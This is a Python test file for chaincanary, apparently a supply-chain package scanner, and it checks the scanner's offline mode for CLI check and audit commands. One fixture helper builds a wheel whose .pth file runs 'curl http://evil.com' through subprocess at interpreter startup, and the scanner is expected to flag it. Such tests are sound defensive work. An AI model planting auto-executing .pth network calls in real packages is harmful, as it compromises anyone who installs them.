"""
Tests for --offline mode.

Offline mode disables all network calls:
- check --offline requires --local (rejects without it)
- engine skips version diff, safe version lookup, and download
- audit --offline + --wheel-dir scans local wheels
"""

from __future__ import annotations

import json
import zipfile
from pathlib import Path
from unittest.mock import patch

from click.testing import CliRunner

from chaincanary.cli import main
from chaincanary.engine import AnalysisEngine
from chaincanary.models import RiskReport

# ── Helpers ──────────────────────────────────────────────────────────


def _create_clean_wheel(tmp_path: Path, name: str = "safe_pkg", version: str = "1.0.0") -> Path:
    """Create a minimal clean .whl file for testing."""
    whl_name = f"{name}-{version}-py3-none-any.whl"
    whl_path = tmp_path / whl_name
    with zipfile.ZipFile(whl_path, "w") as zf:
        zf.writestr(f"{name}/__init__.py", "# clean package\n")
        zf.writestr(
            f"{name}-{version}.dist-info/METADATA",
            f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n",
        )
        zf.writestr(
            f"{name}-{version}.dist-info/RECORD",
            f"{name}/__init__.py,sha256=abc,10\n",
        )
    return whl_path


def _create_malicious_wheel(tmp_path: Path) -> Path:
    """Create a wheel with a dangerous .pth file."""
    whl_path = tmp_path / "evil_pkg-0.1.0-py3-none-any.whl"
    with zipfile.ZipFile(whl_path, "w") as zf:
        zf.writestr("evil_pkg/__init__.py", "# evil\n")
        zf.writestr(
            "evil_init.pth",
            "import os, subprocess; subprocess.Popen(['curl', 'http://evil.com'])\n",
        )
        zf.writestr(
            "evil_pkg-0.1.0.dist-info/METADATA",
            "Metadata-Version: 2.1\nName: evil-pkg\nVersion: 0.1.0\n",
        )
        zf.writestr(
            "evil_pkg-0.1.0.dist-info/RECORD",
            "evil_pkg/__init__.py,sha256=abc,10\n",
        )
    return whl_path


# ── Engine offline mode ──────────────────────────────────────────────


class TestEngineOffline:
    """AnalysisEngine with offline=True skips all network operations."""

    def test_offline_with_local_wheel_succeeds(self, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        report = engine.analyze("safe_pkg", "1.0.0", local_wheel=whl)
        assert isinstance(report, RiskReport)
        assert report.package == "safe_pkg"

    def test_offline_skips_version_diff(self, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        report = engine.analyze("safe_pkg", "1.0.0", local_wheel=whl)
        # No version diff in offline mode
        assert report.behavior_diff is None

    def test_offline_skips_safe_version_lookup(self, tmp_path):
        whl = _create_malicious_wheel(tmp_path)
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        report = engine.analyze("evil_pkg", "0.1.0", local_wheel=whl)
        # Even if malicious, no safe version because we're offline
        assert report.safe_version is None

    @patch("chaincanary.downloader.download_wheel")
    def test_offline_never_calls_download(self, mock_dl, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        engine.analyze("safe_pkg", "1.0.0", local_wheel=whl)
        mock_dl.assert_not_called()

    @patch("chaincanary.downloader.get_all_versions")
    def test_offline_never_calls_get_all_versions(self, mock_gav, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        engine.analyze("safe_pkg", "1.0.0", local_wheel=whl)
        mock_gav.assert_not_called()

    def test_offline_without_local_wheel_returns_info_finding(self):
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        report = engine.analyze("pkg", "1.0.0")
        # Should fail gracefully with an info finding
        assert any(
            f.rule_id == "OFFLINE_NO_WHEEL" for f in report.findings
        )

    def test_offline_detects_malicious_pth(self, tmp_path):
        whl = _create_malicious_wheel(tmp_path)
        engine = AnalysisEngine(skip_dynamic=True, offline=True)
        report = engine.analyze("evil_pkg", "0.1.0", local_wheel=whl)
        assert report.verdict in ("HIGH_RISK", "MALICIOUS")
        assert any("pth" in f.rule_id.lower() or "pth" in f.title.lower() for f in report.findings)


# ── CLI check --offline ──────────────────────────────────────────────


class TestCheckOfflineCLI:
    def test_check_offline_requires_local_flag(self):
        runner = CliRunner()
        result = runner.invoke(main, ["check", "pkg==1.0.0", "--offline"])
        assert result.exit_code != 0
        assert "offline" in result.output.lower() or "local" in result.output.lower()

    def test_check_offline_with_local_works(self, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        runner = CliRunner()
        result = runner.invoke(
            main,
            ["check", "safe_pkg==1.0.0", "--offline", "--local", str(whl)],
        )
        # Should not error out (exit 0 = safe, exit 1 = blocked)
        assert result.exit_code in (0, 1)

    def test_check_offline_json_output(self, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        runner = CliRunner()
        result = runner.invoke(
            main,
            [
                "check", "safe_pkg==1.0.0",
                "--offline", "--local", str(whl), "--json-output",
            ],
        )
        data = json.loads(result.output)
        assert data["package"] == "safe_pkg"
        assert "verdict" in data

    def test_check_offline_sarif_output(self, tmp_path):
        whl = _create_clean_wheel(tmp_path)
        runner = CliRunner()
        result = runner.invoke(
            main,
            [
                "check", "safe_pkg==1.0.0",
                "--offline", "--local", str(whl), "--sarif-output",
            ],
        )
        data = json.loads(result.output)
        assert data["version"] == "2.1.0"
        assert "$schema" in data


# ── CLI audit --offline ──────────────────────────────────────────────


class TestAuditOfflineCLI:
    def test_audit_offline_requires_wheel_dir(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("safe_pkg==1.0.0\n")
        runner = CliRunner()
        result = runner.invoke(
            main,
            ["audit", str(req), "--offline"],
        )
        assert result.exit_code != 0
        assert "wheel-dir" in result.output.lower() or "offline" in result.output.lower()

    def test_audit_offline_with_wheel_dir(self, tmp_path):
        # Create wheels
        wheel_dir = tmp_path / "wheels"
        wheel_dir.mkdir()
        _create_clean_wheel(wheel_dir, "pkg_a", "1.0.0")
        _create_clean_wheel(wheel_dir, "pkg_b", "2.0.0")

        # Create requirements
        req = tmp_path / "requirements.txt"
        req.write_text("pkg-a==1.0.0\npkg-b==2.0.0\n")

        runner = CliRunner()
        result = runner.invoke(
            main,
            [
                "audit", str(req),
                "--offline", "--wheel-dir", str(wheel_dir),
            ],
        )
        assert result.exit_code == 0

    def test_audit_offline_json_output(self, tmp_path):
        wheel_dir = tmp_path / "wheels"
        wheel_dir.mkdir()
        _create_clean_wheel(wheel_dir, "pkg_a", "1.0.0")

        req = tmp_path / "requirements.txt"
        req.write_text("pkg-a==1.0.0\n")

        runner = CliRunner()
        result = runner.invoke(
            main,
            [
                "audit", str(req),
                "--offline", "--wheel-dir", str(wheel_dir),
                "--json-output",
            ],
        )
        data = json.loads(result.output)
        assert "results" in data
        assert len(data["results"]) >= 1

    def test_audit_offline_missing_wheel_reports_unknown(self, tmp_path):
        """Package in lockfile but no matching wheel → UNKNOWN verdict."""
        wheel_dir = tmp_path / "wheels"
        wheel_dir.mkdir()
        # No wheel for pkg_a

        req = tmp_path / "requirements.txt"
        req.write_text("pkg-a==1.0.0\n")

        runner = CliRunner()
        result = runner.invoke(
            main,
            [
                "audit", str(req),
                "--offline", "--wheel-dir", str(wheel_dir),
                "--json-output",
            ],
        )
        data = json.loads(result.output)
        assert any(
            r["verdict"] == "UNKNOWN" for r in data["results"]
        )
